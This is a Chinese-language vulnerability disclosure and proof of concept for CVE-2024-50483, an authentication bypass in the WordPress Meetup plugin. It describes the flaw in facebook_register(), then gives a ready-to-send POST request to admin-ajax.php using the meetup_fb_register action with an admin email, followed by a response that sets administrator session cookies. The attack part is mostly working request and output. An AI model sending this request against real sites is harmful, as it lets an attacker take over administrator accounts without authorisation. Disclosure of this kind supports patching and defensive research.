## WordPress的Meetup插件身份验证绕过漏洞(CVE-2024-50483)

WordPress的Meetup插件在0.1及以下的所有版本中都容易绕过身份验证。这是由于插件在通过facebook_register（）函数对用户进行身份验证之前没有正确验证用户的身份。这使得未经身份验证的攻击者可以作为任何用户登录，只要他们知道自己的电子邮件地址。
注意：您需要知道您要登录的用户电子邮件地址。

poc
---

```javascript
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: kubernetes.docker.internal
Content-Type: application/x-www-form-urlencoded
Content-Length: 149

action=meetup_fb_register&email=admin@admin.com&first_name=Test&last_name=User&id=12345678901234567890&type=token&link=https://example.com/user/test/
```

Response
--

```
HTTP/1.1 200 OK
Date: Tue, 05 Nov 2024 21:37:23 GMT
Server: Apache/2.4.57 (Debian)
X-Powered-By: PHP/8.2.13
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Set-Cookie: wordpress_e2df32a6c3e7076dd7dc7d3f3fec39aa=admin%7C1732052243%7Cip8EqMGbc9Iect9L7RPRWfDKjucVdkdSKINkRz5VxrM%7Cb30fbbd9ddce680d1b3992fc121335abfede4d30ed0ddfea33cab3c7a9c800dd; expires=Wed, 20 Nov 2024 09:37:23 GMT; Max-Age=1252800; path=/wp-content/plugins; HttpOnly
Set-Cookie: wordpress_e2df32a6c3e7076dd7dc7d3f3fec39aa=admin%7C1732052243%7Cip8EqMGbc9Iect9L7RPRWfDKjucVdkdSKINkRz5VxrM%7Cb30fbbd9ddce680d1b3992fc121335abfede4d30ed0ddfea33cab3c7a9c800dd; expires=Wed, 20 Nov 2024 09:37:23 GMT; Max-Age=1252800; path=/wp-admin; HttpOnly
Set-Cookie: wordpress_logged_in_e2df32a6c3e7076dd7dc7d3f3fec39aa=admin%7C1732052243%7Cip8EqMGbc9Iect9L7RPRWfDKjucVdkdSKINkRz5VxrM%7Cecd2fbdf078b2f2b3735b5e423cfae0efa73526e26e17f3cd192896597c7b650; expires=Wed, 20 Nov 2024 09:37:23 GMT; Max-Age=1252800; path=/; HttpOnly
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```